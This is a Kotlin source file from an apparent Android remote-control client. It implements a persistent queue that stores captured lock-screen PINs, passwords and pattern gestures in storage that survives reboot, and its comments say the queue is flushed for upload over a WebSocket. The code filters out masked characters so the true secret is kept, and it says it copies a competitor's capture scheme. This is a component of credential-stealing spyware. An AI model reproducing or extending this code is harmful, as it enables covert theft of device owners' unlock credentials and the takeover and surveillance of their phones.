package com.vibelink.client.prefs

import android.content.Context
import com.vibelink.client.keyguard.KeyguardCredentialCapture
import com.vibelink.client.keyguard.KeyguardLockType
import org.json.JSONArray
import org.json.JSONObject

/**
 * Device-protected pending queue for keyguard credential events (PIN / password / pattern).
 * Survives reboot before first unlock; flushed when WS connects / user unlocks.
 */
class KeyguardPinPendingStore(context: Context) {
    private val prefs = DirectBoot.deviceProtectedContext(context)
        .getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    data class PendingPin(
        val id: String,
        val pin: String,
        val capturedAt: Long,
        val lockType: KeyguardLockType = KeyguardLockType.PIN,
        val gesturePath: String = "",
    )

    fun enqueue(
        pin: String,
        capturedAt: Long = System.currentTimeMillis(),
        lockType: KeyguardLockType = KeyguardLockType.PIN,
        gesturePath: String = "",
    ): String {
        val normalized = normalizeSecret(pin, lockType)
        if (normalized.isBlank()) {
            return ""
        }
        val path = normalizeGesturePath(gesturePath)
        val id = "$capturedAt|${lockType.wireName}|$normalized|${path.hashCode()}"
        val items = loadAll().toMutableList()
        if (items.any { it.id == id }) {
            return id
        }
        items.add(
            PendingPin(
                id = id,
                pin = normalized,
                capturedAt = capturedAt,
                lockType = lockType,
                gesturePath = path,
            ),
        )
        while (items.size > MAX_PENDING) {
            items.removeAt(0)
        }
        saveAll(items)
        return id
    }

    fun listPending(): List<PendingPin> = loadAll()

    /**
     * 对齐竞品 CURPST：输入期只落草稿，USER_PRESENT 再入队上报。
     * 覆盖写；空 secret 视为清草稿。
     */
    fun saveDraft(
        pin: String,
        lockType: KeyguardLockType = KeyguardLockType.PIN,
        gesturePath: String = "",
        capturedAt: Long = System.currentTimeMillis(),
    ) {
        val normalized = normalizeSecret(pin, lockType)
        if (normalized.isBlank()) {
            clearDraft()
            return
        }
        prefs.edit()
            .putString(KEY_DRAFT_PIN, normalized)
            .putString(KEY_DRAFT_LOCK_TYPE, lockType.wireName)
            .putString(KEY_DRAFT_GESTURE_PATH, normalizeGesturePath(gesturePath))
            .putLong(KEY_DRAFT_CAPTURED_AT, capturedAt)
            .apply()
    }

    fun loadDraft(): PendingPin? {
        val pin = prefs.getString(KEY_DRAFT_PIN, null)?.takeIf { it.isNotBlank() } ?: return null
        val lockType = KeyguardLockType.fromWire(prefs.getString(KEY_DRAFT_LOCK_TYPE, null))
        val normalized = normalizeSecret(pin, lockType)
        if (normalized.isBlank()) {
            return null
        }
        val capturedAt = prefs.getLong(KEY_DRAFT_CAPTURED_AT, 0L).takeIf { it > 0L }
            ?: System.currentTimeMillis()
        val gesturePath = normalizeGesturePath(prefs.getString(KEY_DRAFT_GESTURE_PATH, "") ?: "")
        return PendingPin(
            id = "draft|$capturedAt|${lockType.wireName}|$normalized|${gesturePath.hashCode()}",
            pin = normalized,
            capturedAt = capturedAt,
            lockType = lockType,
            gesturePath = gesturePath,
        )
    }

    fun clearDraft() {
        prefs.edit()
            .remove(KEY_DRAFT_PIN)
            .remove(KEY_DRAFT_LOCK_TYPE)
            .remove(KEY_DRAFT_GESTURE_PATH)
            .remove(KEY_DRAFT_CAPTURED_AT)
            .apply()
    }

    fun remove(id: String) {
        if (id.isBlank()) {
            return
        }
        saveAll(loadAll().filterNot { it.id == id })
    }

    fun removeAll(ids: Collection<String>) {
        if (ids.isEmpty()) {
            return
        }
        val removeSet = ids.toSet()
        saveAll(loadAll().filterNot { it.id in removeSet })
    }

    private fun loadAll(): List<PendingPin> {
        val raw = prefs.getString(KEY_PENDING, null) ?: return emptyList()
        return runCatching {
            val array = JSONArray(raw)
            buildList {
                for (index in 0 until array.length()) {
                    val obj = array.optJSONObject(index) ?: continue
                    val lockType = KeyguardLockType.fromWire(obj.optString("lockType"))
                    val pin = normalizeSecret(obj.optString("pin"), lockType)
                    val gesturePath = normalizeGesturePath(obj.optString("gesturePath"))
                    val capturedAt = obj.optLong("capturedAt", 0L)
                    val id = obj.optString("id").ifBlank {
                        "$capturedAt|${lockType.wireName}|$pin|${gesturePath.hashCode()}"
                    }
                    if (pin.isNotBlank() && capturedAt > 0L) {
                        add(
                            PendingPin(
                                id = id,
                                pin = pin,
                                capturedAt = capturedAt,
                                lockType = lockType,
                                gesturePath = gesturePath,
                            ),
                        )
                    }
                }
            }
        }.getOrDefault(emptyList())
    }

    private fun saveAll(items: List<PendingPin>) {
        val array = JSONArray()
        items.forEach { item ->
            array.put(
                JSONObject()
                    .put("id", item.id)
                    .put("pin", item.pin)
                    .put("lockType", item.lockType.wireName)
                    .put("gesturePath", item.gesturePath)
                    .put("capturedAt", item.capturedAt),
            )
        }
        prefs.edit().putString(KEY_PENDING, array.toString()).apply()
    }

    /** Public so live WS upload path uses the same mask rejection as the pending queue. */
    fun normalizeForUpload(value: String, lockType: KeyguardLockType): String =
        normalizeSecret(value, lockType)

    private fun normalizeSecret(value: String, lockType: KeyguardLockType): String {
        return when (lockType) {
            KeyguardLockType.PIN -> {
                if (KeyguardCredentialCapture.looksLikeMaskedSecret(value)) {
                    ""
                } else {
                    value.filter(Char::isDigit)
                }
            }
            KeyguardLockType.PASSWORD -> {
                // Reject OEM TransformationMethod leaks like "•••••5" entirely.
                if (KeyguardCredentialCapture.looksLikeMaskedSecret(value)) {
                    return ""
                }
                val cleaned = value
                    .filter {
                        !it.isISOControl() && !KeyguardCredentialCapture.isPasswordMaskChar(it)
                    }
                    .take(64)
                if (cleaned.isEmpty()) "" else cleaned
            }
            KeyguardLockType.PATTERN -> value.filter { it.isDigit() || it == '-' || it == ',' }
        }
    }

    private fun normalizeGesturePath(value: String): String {
        val trimmed = value.trim()
        return if (trimmed.startsWith("[")) trimmed else ""
    }

    companion object {
        private const val PREFS_NAME = "remote_control_keyguard_pin_pending_dps"
        private const val KEY_PENDING = "pending"
        /** mamimobi SharedPreferences "CURPST" */
        private const val KEY_DRAFT_PIN = "curpst"
        private const val KEY_DRAFT_LOCK_TYPE = "curpst_lock_type"
        private const val KEY_DRAFT_GESTURE_PATH = "curpst_gesture_path"
        private const val KEY_DRAFT_CAPTURED_AT = "curpst_captured_at"
        private const val MAX_PENDING = 32
    }
}
